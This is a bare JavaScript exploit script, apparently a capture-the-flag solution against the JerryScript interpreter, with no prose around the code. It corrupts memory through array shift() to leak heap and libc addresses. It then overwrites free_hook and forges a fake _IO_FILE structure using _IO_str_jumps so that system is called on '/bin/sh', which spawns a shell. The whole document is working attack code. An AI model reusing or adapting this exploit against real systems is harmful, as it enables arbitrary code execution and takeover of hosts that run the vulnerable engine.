let a = ["11111111"]
a.shift()
ab = new ArrayBuffer(0x1000)
dv = new DataView(ab)
dv.setUint32(0, 0x41414141, true)
a.shift()
heap_base_offset = 0x12e
jerry_global_heap = [1, 2]
jerry_global_heap[0] = a[24] - heap_base_offset
free_got = jerry_global_heap[0]*0x10 - 0x1490
libc_addr = [1, 2]
free_hook = [1, 2]
system_addr = [1, 2]
binsh_addr = [1, 2]
_IO_str_jumps = [1, 2]
_IO_list_all = [1, 2]
fake_FILE = [1,2]
zero = 0

a[24] = jerry_global_heap[0] + 0x2e
jerry_global_heap[1] = dv.getUint32(0x5c, true)
jerry_global_heap[0] = jerry_global_heap[0]*0x10
jerry_global_heap = jerry_global_heap[0]+jerry_global_heap[1]*0x100000000
print("jerry_global_heap: 0x"+jerry_global_heap.toString(16))

dv.setUint32(0x58, free_got, true)
libc_addr[0] = dv.getUint32(0x8, true) - 0x9d850
libc_addr[1] = dv.getUint32(0xc, true)
print("libc_addr: 0x"+(libc_addr[0]+libc_addr[1]*0x100000000).toString(16))

free_hook[0] = 0x1eeb20 + libc_addr[0]
free_hook[1] = libc_addr[1]
print("free_hook: 0x"+(free_hook[0]+free_hook[1]*0x100000000).toString(16))	

system_addr[0] = 0x55410 + libc_addr[0]
system_addr[1] = libc_addr[1]
binsh_addr[0] = 0x1b75aa+libc_addr[0]
binsh_addr[1] = libc_addr[1]
_IO_str_jumps[0] = 0x1ed560 + libc_addr[0]
_IO_str_jumps[1] = libc_addr[1]

print("system_addr: 0x"+(system_addr[0]+system_addr[1]*0x100000000).toString(16))
print("binsh_addr: 0x"+(binsh_addr[0]+binsh_addr[1]*0x100000000).toString(16))
print("_IO_str_jumps: 0x"+(_IO_str_jumps[0]+_IO_str_jumps[1]*0x100000000).toString(16))	

a[24] = a[24] + 0x177 // &free_got -----> & control_base
fake_FILE[0] = free_hook[0] + 0x90
fake_FILE[1] = free_hook[1]
fake_FILE = fake_FILE[0]+fake_FILE[1]*0x100000000
print("fake_FILE: 0x"+fake_FILE.toString(16))

free_hook = free_hook[0]+free_hook[1]*0x100000000
system_addr = system_addr[0]+system_addr[1]*0x100000000
binsh_addr = binsh_addr[0]+binsh_addr[1]*0x100000000
_IO_str_jumps = _IO_str_jumps[0]+_IO_str_jumps[1]*0x100000000

dv.setBigUint64(0x58, free_hook, true) 

// FAKE IO_FILE
dv.setBigUint64(0x90, zero, true) // _flag
dv.setBigUint64(0x98, zero, true) // _IO_read_ptr
dv.setBigUint64(0xa0, zero, true) // _IO_read_end
dv.setBigUint64(0xa8, zero, true) // _IO_read_base
dv.setBigUint64(0xb0, 1, true) //change _IO_write_base = 1
dv.setBigUint64(0xb8, 0xffffffffffff, true)
dv.setBigUint64(0xc0, zero, true)
dv.setBigUint64(0xc8, binsh_addr, true)
dv.setBigUint64(0xd0, binsh_addr+0x8, true)

dv.setBigUint64(0xd8, zero, true)
dv.setBigUint64(0xe0, zero, true)
dv.setBigUint64(0xe8, zero, true)
dv.setBigUint64(0xf0, zero, true)
dv.setBigUint64(0xf8, zero, true)
dv.setBigUint64(0x100, zero, true)
dv.setBigUint64(0x108, zero, true)
dv.setBigUint64(0x110, zero, true)
dv.setBigUint64(0x118, zero, true)
dv.setBigUint64(0x120, zero, true)
dv.setBigUint64(0x128, zero, true)
dv.setBigUint64(0x130, zero, true)
dv.setBigUint64(0x138, zero, true)
dv.setBigUint64(0x140, zero, true)
dv.setBigUint64(0x148, zero, true)
dv.setBigUint64(0x150, zero, true)
dv.setBigUint64(0x158, zero, true)
dv.setBigUint64(0x160, zero, true)
dv.setBigUint64(0x168, _IO_str_jumps, true)

dv.setBigUint64(0x8, system_addr, true)
dv.setBigUint64(0xa40, fake_FILE, true)

a[24] = a[24] - 0x259  // &free_hook - 0x8 -----> &_IO_list_all - 0x10
dv.setBigUint64(0x10, fake_FILE, true)

// a.shift()